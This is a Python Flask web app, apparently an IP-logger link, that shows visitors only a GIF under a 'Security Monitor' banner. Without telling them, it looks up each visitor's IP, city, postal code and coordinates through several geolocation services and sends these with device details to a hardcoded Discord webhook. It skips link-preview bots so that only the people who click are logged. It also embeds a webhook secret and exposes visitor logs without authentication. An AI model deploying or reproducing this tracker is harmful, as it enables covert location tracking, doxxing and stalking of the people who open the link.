from flask import Flask, request, render_template_string, jsonify, abort
import requests
import json
import os
from datetime import datetime
import re
import time
import hashlib

app = Flask(__name__)

# Configuration - Using Environment Variables
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', "https://discord.com/api/webhooks/1527150420537905292/kayD-ghBN6shDNhFJNPOuncX9myoTGpqAMnMMEZqGSoMchA47oTvViwJiBbBQUpJBxjQ")
OWNER_ID = os.environ.get('OWNER_ID', "1477672979272831089")

# Default GIF URL
DEFAULT_MEDIA_URL = "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExNW8xa2p0bjZzenluNDlqN3dmaDd0MTcwcWwyeGoydWpoNjQyZWY3ZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/l0IyeheChYxx2byDu/giphy.gif"

# Store current media URL
current_media_url = DEFAULT_MEDIA_URL
media_type = "gif"

# Store visitor logs (in-memory, will reset on restart)
visitor_logs = []
MAX_LOGS = 100

# Blacklist file path
BLACKLIST_FILE = 'blacklist.json'

# Load blacklist
def load_blacklist():
    """Load blacklist from JSON file"""
    try:
        if os.path.exists(BLACKLIST_FILE):
            with open(BLACKLIST_FILE, 'r') as f:
                data = json.load(f)
                return data.get('blacklisted_ips', [])
        return []
    except Exception as e:
        print(f"Error loading blacklist: {e}")
        return []

# Save blacklist
def save_blacklist(blacklist):
    """Save blacklist to JSON file"""
    try:
        with open(BLACKLIST_FILE, 'w') as f:
            json.dump({'blacklisted_ips': blacklist}, f, indent=2)
        return True
    except Exception as e:
        print(f"Error saving blacklist: {e}")
        return False

# Initialize blacklist
BLACKLISTED_IPS = load_blacklist()

# Common bot user agents to filter out
BOT_USER_AGENTS = [
    'bot', 'crawler', 'spider', 'scraper', 'scan', 'ping', 'uptime',
    'healthcheck', 'monitor', 'status', 'check', 'test', 'curl',
    'wget', 'python-requests', 'java', 'go-http-client', 'okhttp',
    'http-client', 'axios', 'node-fetch', 'php', 'perl', 'ruby',
    'headless', 'phantom', 'selenium', 'puppeteer', 'playwright',
    'lighthouse', 'pagespeed', 'gtmetrix', 'pingdom', 'newrelic',
    'datadog', 'sentry', 'cloudflare', 'vercel', 'netlify', 'aws',
    'azure', 'gcp', 'googlebot', 'bingbot', 'yandex', 'baidu',
    'duckduckbot', 'slurp', 'twitterbot', 'facebookexternalhit',
    'whatsapp', 'telegrambot', 'discordbot', 'slackbot'
]

def is_bot_request(user_agent, request_path):
    """Check if request is from a bot/ping/health check"""
    
    # Skip bot detection for API routes (they can be checked separately)
    if request_path.startswith('/api/'):
        return False
    
    # Check for common bot user agents
    if user_agent:
        user_agent_lower = user_agent.lower()
        for bot in BOT_USER_AGENTS:
            if bot in user_agent_lower:
                return True
    
    # Check for empty user agent (often bots)
    if not user_agent or user_agent.strip() == '':
        return True
    
    # Check for known bot IP ranges (Vercel's internal IPs)
    ip = get_real_ip()
    if ip:
        # Vercel's internal IPs and common monitoring services
        vercel_ips = ['169.254', '::1', '127.0.0.1']
        for v_ip in vercel_ips:
            if ip.startswith(v_ip):
                return True
    
    # Check for common bot headers
    headers_to_check = [
        'X-Vercel-Id',  # Vercel internal
        'X-Vercel-Cache',  # Vercel cache
        'X-Amz-Cf-Id',  # AWS CloudFront
        'X-Forwarded-Proto',  # Often used by proxies but not always bots
    ]
    
    # Check for specific request patterns that indicate bots
    if request.headers.get('Purpose') == 'prefetch':
        return True
    
    if request.headers.get('X-Purpose') == 'prefetch':
        return True
    
    return False

def get_real_ip():
    """Get the real IP address from request headers (works with Vercel and other proxies)"""
    
    # Try all possible headers in order of reliability
    headers_to_check = [
        'X-Forwarded-For',
        'X-Real-IP',
        'CF-Connecting-IP',  # Cloudflare
        'True-Client-IP',    # Akamai
        'X-Originating-IP',
        'X-Remote-IP',
        'X-Remote-Addr',
        'X-Client-IP',
        'X-ProxyUser-Ip',
    ]
    
    for header in headers_to_check:
        ip = request.headers.get(header)
        if ip:
            if header == 'X-Forwarded-For':
                ip = ip.split(',')[0].strip()
            # Validate it's a real IP (not localhost, private, etc.)
            if ip and ip != '127.0.0.1' and ip != '::1' and not ip.startswith('192.168.') and not ip.startswith('10.'):
                return ip
    
    # Vercel specific
    vercel_ip = os.environ.get('VERCEL_CLIENT_IP')
    if vercel_ip:
        return vercel_ip
    
    # Fallback to remote_addr
    remote_addr = request.remote_addr
    if remote_addr and remote_addr != '127.0.0.1' and remote_addr != '::1':
        return remote_addr
    
    return None

def get_public_ip():
    """Get visitor's public IP address with fallback"""
    real_ip = get_real_ip()
    
    if real_ip:
        return real_ip
    
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=3)
        if response.status_code == 200:
            data = response.json()
            return data.get('ip', 'Unknown')
    except:
        pass
    
    return "Unknown"

def is_ip_blacklisted(ip):
    """Check if an IP is in the blacklist"""
    if not ip or ip == "Unknown":
        return False
    return ip in BLACKLISTED_IPS

def get_accurate_geo_location(ip):
    """Get accurate geolocation data using multiple services"""
    
    if ip in ["Unknown", "Unable to retrieve", "127.0.0.1", "::1", "0.0.0.0"] or not ip:
        return {
            'ip': ip or 'Unknown',
            'country': 'Unknown',
            'country_code': 'N/A',
            'region': 'Unknown',
            'city': 'Unknown',
            'postal': 'N/A',
            'latitude': 'N/A',
            'longitude': 'N/A',
            'timezone': 'UTC',
            'isp': 'Unknown',
            'org': 'Unknown',
            'asn': 'N/A',
            'as_name': 'N/A',
            'source': 'none'
        }
    
    # Try ip-api.com first
    try:
        response = requests.get(
            f'http://ip-api.com/json/{ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,query',
            timeout=5
        )
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return {
                    'ip': data.get('query', ip),
                    'country': data.get('country', 'N/A'),
                    'country_code': data.get('countryCode', 'N/A'),
                    'region': data.get('regionName', 'N/A'),
                    'city': data.get('city', 'N/A'),
                    'postal': data.get('zip', 'N/A'),
                    'latitude': data.get('lat', 'N/A'),
                    'longitude': data.get('lon', 'N/A'),
                    'timezone': data.get('timezone', 'N/A'),
                    'isp': data.get('isp', 'N/A'),
                    'org': data.get('org', 'N/A'),
                    'asn': data.get('as', 'N/A'),
                    'as_name': data.get('asname', 'N/A'),
                    'source': 'ip-api.com'
                }
    except:
        pass
    
    # Try ipapi.co as backup
    try:
        response = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if 'error' not in data:
                return {
                    'ip': data.get('ip', ip),
                    'country': data.get('country_name', 'N/A'),
                    'country_code': data.get('country_code', 'N/A'),
                    'region': data.get('region', 'N/A'),
                    'city': data.get('city', 'N/A'),
                    'postal': data.get('postal', 'N/A'),
                    'latitude': data.get('latitude', 'N/A'),
                    'longitude': data.get('longitude', 'N/A'),
                    'timezone': data.get('timezone', 'N/A'),
                    'isp': data.get('org', 'N/A'),
                    'org': data.get('org', 'N/A'),
                    'asn': data.get('asn', 'N/A'),
                    'as_name': data.get('asn_name', 'N/A'),
                    'source': 'ipapi.co'
                }
    except:
        pass
    
    # Try ipinfo.io
    try:
        response = requests.get(f'https://ipinfo.io/{ip}/json', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if 'error' not in data:
                lat_lon = data.get('loc', 'N/A').split(',')
                latitude = lat_lon[0] if len(lat_lon) > 0 else 'N/A'
                longitude = lat_lon[1] if len(lat_lon) > 1 else 'N/A'
                
                return {
                    'ip': data.get('ip', ip),
                    'country': data.get('country', 'N/A'),
                    'country_code': data.get('country', 'N/A')[:2],
                    'region': data.get('region', 'N/A'),
                    'city': data.get('city', 'N/A'),
                    'postal': data.get('postal', 'N/A'),
                    'latitude': latitude,
                    'longitude': longitude,
                    'timezone': data.get('timezone', 'N/A'),
                    'isp': data.get('org', 'N/A'),
                    'org': data.get('org', 'N/A'),
                    'asn': 'N/A',
                    'as_name': 'N/A',
                    'source': 'ipinfo.io'
                }
    except:
        pass
    
    # Fallback
    return {
        'ip': ip,
        'country': 'Unknown',
        'country_code': 'N/A',
        'region': 'Unknown',
        'city': 'Unknown',
        'postal': 'N/A',
        'latitude': 'N/A',
        'longitude': 'N/A',
        'timezone': 'UTC',
        'isp': 'Unknown',
        'org': 'Unknown',
        'asn': 'N/A',
        'as_name': 'N/A',
        'source': 'fallback'
    }

def get_browser_info(user_agent):
    """Extract browser and system information"""
    browser_info = {
        'browser': 'Unknown',
        'browser_version': 'Unknown',
        'os': 'Unknown',
        'os_version': 'Unknown',
        'device': 'Unknown',
        'is_mobile': False
    }
    
    if user_agent:
        # Browser detection with version
        if 'Chrome' in user_agent and 'Edg' not in user_agent and 'OPR' not in user_agent:
            browser_info['browser'] = 'Chrome'
            match = re.search(r'Chrome/(\d+\.\d+\.\d+\.\d+)', user_agent)
            if match:
                browser_info['browser_version'] = match.group(1)
        elif 'Firefox' in user_agent:
            browser_info['browser'] = 'Firefox'
            match = re.search(r'Firefox/(\d+\.\d+)', user_agent)
            if match:
                browser_info['browser_version'] = match.group(1)
        elif 'Safari' in user_agent and 'Chrome' not in user_agent:
            browser_info['browser'] = 'Safari'
            match = re.search(r'Version/(\d+\.\d+\.\d+)', user_agent)
            if match:
                browser_info['browser_version'] = match.group(1)
        elif 'Edg' in user_agent:
            browser_info['browser'] = 'Edge'
            match = re.search(r'Edg/(\d+\.\d+\.\d+\.\d+)', user_agent)
            if match:
                browser_info['browser_version'] = match.group(1)
        elif 'OPR' in user_agent or 'Opera' in user_agent:
            browser_info['browser'] = 'Opera'
            match = re.search(r'OPR/(\d+\.\d+\.\d+\.\d+)', user_agent)
            if match:
                browser_info['browser_version'] = match.group(1)
        
        # OS detection
        if 'Windows NT 10.0' in user_agent:
            browser_info['os'] = 'Windows 10/11'
        elif 'Windows NT 6.3' in user_agent:
            browser_info['os'] = 'Windows 8.1'
        elif 'Windows NT 6.2' in user_agent:
            browser_info['os'] = 'Windows 8'
        elif 'Windows NT 6.1' in user_agent:
            browser_info['os'] = 'Windows 7'
        elif 'Mac OS X' in user_agent:
            browser_info['os'] = 'macOS'
            match = re.search(r'Mac OS X (\d+_\d+_\d+)', user_agent)
            if match:
                browser_info['os_version'] = match.group(1).replace('_', '.')
        elif 'Linux' in user_agent and 'Android' not in user_agent:
            browser_info['os'] = 'Linux'
        elif 'Android' in user_agent:
            browser_info['os'] = 'Android'
            browser_info['is_mobile'] = True
            match = re.search(r'Android (\d+\.\d+\.\d+)', user_agent)
            if match:
                browser_info['os_version'] = match.group(1)
        elif 'iPhone' in user_agent or 'iPad' in user_agent:
            browser_info['os'] = 'iOS'
            browser_info['is_mobile'] = True
        
        # Device detection
        if 'iPhone' in user_agent:
            browser_info['device'] = 'iPhone'
        elif 'iPad' in user_agent:
            browser_info['device'] = 'iPad'
        elif 'Android' in user_agent and 'Mobile' in user_agent:
            browser_info['device'] = 'Android Phone'
        elif 'Android' in user_agent:
            browser_info['device'] = 'Android Tablet'
        elif 'Windows' in user_agent:
            browser_info['device'] = 'Windows PC'
        elif 'Mac' in user_agent:
            browser_info['device'] = 'Mac'
        elif 'Linux' in user_agent:
            browser_info['device'] = 'Linux PC'
    
    return browser_info

def send_discord_embed(visitor_data):
    """Send detailed embed to Discord"""
    
    # Create location string
    location_parts = []
    if visitor_data.get('city') and visitor_data['city'] not in ['N/A', 'Unknown']:
        location_parts.append(visitor_data['city'])
    if visitor_data.get('region') and visitor_data['region'] not in ['N/A', 'Unknown']:
        location_parts.append(visitor_data['region'])
    if visitor_data.get('country') and visitor_data['country'] not in ['N/A', 'Unknown']:
        location_parts.append(visitor_data['country'])
    
    location = ', '.join(location_parts) if location_parts else 'Unknown'
    
    # Create ISP string
    isp_parts = []
    if visitor_data.get('isp') and visitor_data['isp'] not in ['N/A', 'Unknown']:
        isp_parts.append(visitor_data['isp'])
    if visitor_data.get('as_name') and visitor_data['as_name'] != 'N/A':
        isp_parts.append(f"(AS{visitor_data.get('asn', 'N/A')})")
    
    isp_info = ' '.join(isp_parts) if isp_parts else 'Unknown'
    
    embed = {
        "title": "🛡️ Security Alert - New Visitor Detected",
        "color": 0x00ff00,
        "timestamp": datetime.utcnow().isoformat(),
        "fields": [
            {
                "name": "🌐 IP Address",
                "value": f"`{visitor_data.get('ip', 'N/A')}`",
                "inline": True
            },
            {
                "name": "📍 Location",
                "value": location,
                "inline": True
            },
            {
                "name": "🗺️ Coordinates",
                "value": f"Lat: {visitor_data.get('latitude', 'N/A')}\nLon: {visitor_data.get('longitude', 'N/A')}",
                "inline": True
            },
            {
                "name": "🕐 Timezone",
                "value": visitor_data.get('timezone', 'N/A'),
                "inline": True
            },
            {
                "name": "🏢 ISP/Organization",
                "value": isp_info,
                "inline": True
            },
            {
                "name": "📮 Postal Code",
                "value": visitor_data.get('postal', 'N/A'),
                "inline": True
            },
            {
                "name": "🌍 Browser",
                "value": f"{visitor_data.get('browser', 'Unknown')} {visitor_data.get('browser_version', '')}".strip(),
                "inline": True
            },
            {
                "name": "💻 Operating System",
                "value": f"{visitor_data.get('os', 'Unknown')} {visitor_data.get('os_version', '')}".strip(),
                "inline": True
            },
            {
                "name": "📱 Device",
                "value": visitor_data.get('device', 'Unknown'),
                "inline": True
            },
            {
                "name": "📋 User Agent",
                "value": visitor_data.get('user_agent', 'N/A')[:200] + ("..." if len(visitor_data.get('user_agent', '')) > 200 else ""),
                "inline": False
            },
            {
                "name": "⏰ Visit Time",
                "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
                "inline": True
            },
            {
                "name": "📊 Data Source",
                "value": visitor_data.get('geo_source', 'N/A'),
                "inline": True
            }
        ],
        "footer": {
            "text": "🔒 Security Monitoring System | Real Visitor Detection"
        }
    }
    
    data = {
        "embeds": [embed]
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=data, timeout=10)
        return response.status_code == 204
    except:
        return False

# HTML Template (same as before)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Monitor</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #0a0e27 0%, #1a1a3e 50%, #0a0e27 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            padding: 20px;
        }
        
        .container {
            max-width: 900px;
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
        }
        
        .media-container {
            position: relative;
            width: 100%;
            padding-bottom: 56.25%;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        
        .media-container img {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .status-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            border: 1px solid rgba(0, 255, 0, 0.1);
        }
        
        .status-indicator {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #00ff00;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
        
        .status-text {
            color: #00ff00;
            font-size: 14px;
            font-weight: 500;
            letter-spacing: 1px;
        }
        
        .media-info {
            color: rgba(255, 255, 255, 0.5);
            font-size: 12px;
            font-family: monospace;
        }
        
        .glow-effect {
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(0, 255, 0, 0.03) 0%, transparent 70%);
            pointer-events: none;
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 15px;
            }
            
            .status-bar {
                flex-direction: column;
                gap: 10px;
                align-items: flex-start;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="media-container">
            <div class="glow-effect"></div>
            <img src="{{ media_url }}" alt="Security Monitor">
        </div>
        
        <div class="status-bar">
            <div class="status-indicator">
                <div class="status-dot"></div>
                <span class="status-text">Security Monitoring Active</span>
            </div>
            <div class="media-info">
                {{ media_type|upper }} • {{ media_url[:30] }}...
            </div>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    global current_media_url, media_type
    
    # Get the real visitor IP
    visitor_ip = get_real_ip()
    user_agent = request.headers.get('User-Agent', '')
    request_path = request.path
    
    # Check if it's a bot/ping request
    if is_bot_request(user_agent, request_path):
        # Return empty response for bots (no tracking)
        return '', 200
    
    # Check if IP is blacklisted
    if visitor_ip and is_ip_blacklisted(visitor_ip):
        # Block blacklisted IPs - return empty response
        return '', 403
    
    # If no valid IP, return page without tracking
    if not visitor_ip or visitor_ip in ["Unknown", "127.0.0.1", "::1"]:
        return render_template_string(
            HTML_TEMPLATE,
            media_url=current_media_url,
            media_type=media_type
        )
    
    # Get public IP with fallback
    public_ip = get_public_ip()
    
    # Get accurate geolocation
    geo_data = get_accurate_geo_location(public_ip)
    
    # Get browser info
    browser_info = get_browser_info(user_agent)
    
    # Prepare visitor data
    visitor_data = {
        'ip': public_ip,
        'country': geo_data.get('country', 'N/A'),
        'country_code': geo_data.get('country_code', 'N/A'),
        'region': geo_data.get('region', 'N/A'),
        'city': geo_data.get('city', 'N/A'),
        'postal': geo_data.get('postal', 'N/A'),
        'latitude': geo_data.get('latitude', 'N/A'),
        'longitude': geo_data.get('longitude', 'N/A'),
        'timezone': geo_data.get('timezone', 'N/A'),
        'isp': geo_data.get('isp', 'N/A'),
        'org': geo_data.get('org', 'N/A'),
        'asn': geo_data.get('asn', 'N/A'),
        'as_name': geo_data.get('as_name', 'N/A'),
        'geo_source': geo_data.get('source', 'N/A'),
        'browser': browser_info['browser'],
        'browser_version': browser_info['browser_version'],
        'os': browser_info['os'],
        'os_version': browser_info['os_version'],
        'device': browser_info['device'],
        'is_mobile': browser_info['is_mobile'],
        'user_agent': user_agent,
        'visit_time': datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    }
    
    # Store log
    visitor_logs.append(visitor_data)
    if len(visitor_logs) > MAX_LOGS:
        visitor_logs.pop(0)
    
    # Send to Discord
    send_discord_embed(visitor_data)
    
    # Return the HTML page
    return render_template_string(
        HTML_TEMPLATE,
        media_url=current_media_url,
        media_type=media_type
    )

@app.route('/command', methods=['POST'])
def handle_command():
    """Handle Discord commands from owner"""
    global current_media_url, media_type, BLACKLISTED_IPS
    
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Invalid request"}), 400
        
        user_id = data.get('user_id')
        if user_id != OWNER_ID:
            send_discord_command_response("❌ Unauthorized: You are not the owner", False)
            return jsonify({"error": "Unauthorized"}), 403
        
        command = data.get('command', '').strip()
        
        if command.startswith('/gif '):
            new_url = command[5:].strip()
            if is_valid_url(new_url):
                current_media_url = new_url
                media_type = "gif"
                send_discord_command_response(f"✅ GIF updated successfully!\nNew URL: {new_url}", True)
                return jsonify({"success": True, "media_url": new_url, "type": "gif"}), 200
            else:
                send_discord_command_response("❌ Invalid URL provided", False)
                return jsonify({"error": "Invalid URL"}), 400
                
        elif command.startswith('/img '):
            new_url = command[5:].strip()
            if is_valid_url(new_url):
                current_media_url = new_url
                media_type = "img"
                send_discord_command_response(f"✅ Image updated successfully!\nNew URL: {new_url}", True)
                return jsonify({"success": True, "media_url": new_url, "type": "img"}), 200
            else:
                send_discord_command_response("❌ Invalid URL provided", False)
                return jsonify({"error": "Invalid URL"}), 400
        
        elif command == '/reset':
            current_media_url = DEFAULT_MEDIA_URL
            media_type = "gif"
            send_discord_command_response("✅ Media reset to default GIF", True)
            return jsonify({"success": True, "media_url": DEFAULT_MEDIA_URL, "type": "gif"}), 200
        
        elif command == '/status':
            send_discord_command_response(f"📊 Current Status:\nType: {media_type}\nURL: {current_media_url}\nVisitors: {len(visitor_logs)}\nBlacklisted IPs: {len(BLACKLISTED_IPS)}", True)
            return jsonify({
                "success": True, 
                "media_url": current_media_url, 
                "type": media_type,
                "total_visitors": len(visitor_logs),
                "blacklisted_count": len(BLACKLISTED_IPS)
            }), 200
        
        elif command == '/logs':
            # Return last 5 logs
            log_summary = []
            for log in visitor_logs[-5:]:
                log_summary.append({
                    'ip': log.get('ip', 'N/A'),
                    'location': f"{log.get('city', 'N/A')}, {log.get('country', 'N/A')}",
                    'time': log.get('visit_time', 'N/A')
                })
            return jsonify({"logs": log_summary}), 200
        
        # Blacklist commands
        elif command.startswith('/blacklist add '):
            ip_to_blacklist = command[15:].strip()
            if ip_to_blacklist and ip_to_blacklist not in BLACKLISTED_IPS:
                BLACKLISTED_IPS.append(ip_to_blacklist)
                save_blacklist(BLACKLISTED_IPS)
                send_discord_command_response(f"✅ IP {ip_to_blacklist} has been blacklisted", True)
                return jsonify({"success": True, "action": "add", "ip": ip_to_blacklist}), 200
            else:
                send_discord_command_response(f"❌ IP {ip_to_blacklist} is already blacklisted or invalid", False)
                return jsonify({"error": "IP already blacklisted or invalid"}), 400
        
        elif command.startswith('/blacklist remove '):
            ip_to_remove = command[18:].strip()
            if ip_to_remove in BLACKLISTED_IPS:
                BLACKLISTED_IPS.remove(ip_to_remove)
                save_blacklist(BLACKLISTED_IPS)
                send_discord_command_response(f"✅ IP {ip_to_remove} has been removed from blacklist", True)
                return jsonify({"success": True, "action": "remove", "ip": ip_to_remove}), 200
            else:
                send_discord_command_response(f"❌ IP {ip_to_remove} not found in blacklist", False)
                return jsonify({"error": "IP not in blacklist"}), 400
        
        elif command == '/blacklist list':
            if BLACKLISTED_IPS:
                ips_list = '\n'.join([f'• {ip}' for ip in BLACKLISTED_IPS])
                send_discord_command_response(f"📋 Blacklisted IPs ({len(BLACKLISTED_IPS)}):\n{ips_list}", True)
            else:
                send_discord_command_response("📋 No IPs are currently blacklisted", True)
            return jsonify({"blacklisted_ips": BLACKLISTED_IPS}), 200
        
        elif command == '/blacklist clear':
            BLACKLISTED_IPS.clear()
            save_blacklist(BLACKLISTED_IPS)
            send_discord_command_response("✅ All IPs have been removed from blacklist", True)
            return jsonify({"success": True, "action": "clear"}), 200
        
        else:
            help_text = """📋 **Available Commands:**
• `/gif <url>` - Change GIF
• `/img <url>` - Change Image
• `/reset` - Reset to default
• `/status` - Show current status
• `/logs` - Show last 5 visitors
• `/blacklist add <ip>` - Blacklist an IP
• `/blacklist remove <ip>` - Remove from blacklist
• `/blacklist list` - List all blacklisted IPs
• `/blacklist clear` - Clear all blacklisted IPs"""
            
            send_discord_command_response(help_text, True)
            return jsonify({"error": "Unknown command", "help": help_text}), 400
            
    except Exception as e:
        send_discord_command_response(f"❌ Error: {str(e)}", False)
        return jsonify({"error": str(e)}), 500

def send_discord_command_response(message, success=True):
    """Send command response to Discord"""
    embed = {
        "title": "✅ Command Executed" if success else "❌ Command Failed",
        "color": 0x00ff00 if success else 0xff0000,
        "description": message,
        "timestamp": datetime.utcnow().isoformat()
    }
    
    data = {
        "embeds": [embed]
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=data, timeout=10)
        return response.status_code == 204
    except:
        return False

def is_valid_url(url):
    """Validate URL format"""
    url_pattern = re.compile(
        r'^https?://'
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?|'
        r'localhost|'
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
        r'(?::\d+)?'
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(url_pattern, url) is not None

@app.route('/api/status')
def get_status():
    """Get current media status"""
    return jsonify({
        "media_url": current_media_url,
        "media_type": media_type,
        "default_url": DEFAULT_MEDIA_URL,
        "total_visitors": len(visitor_logs),
        "blacklisted_count": len(BLACKLISTED_IPS)
    })

@app.route('/api/last_visitor')
def get_last_visitor():
    """Get last visitor data (for debugging)"""
    if visitor_logs:
        return jsonify(visitor_logs[-1])
    return jsonify({"message": "No visitors yet"})

@app.route('/api/blacklist')
def get_blacklist():
    """Get blacklisted IPs (for debugging)"""
    return jsonify({"blacklisted_ips": BLACKLISTED_IPS})

# For local testing
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
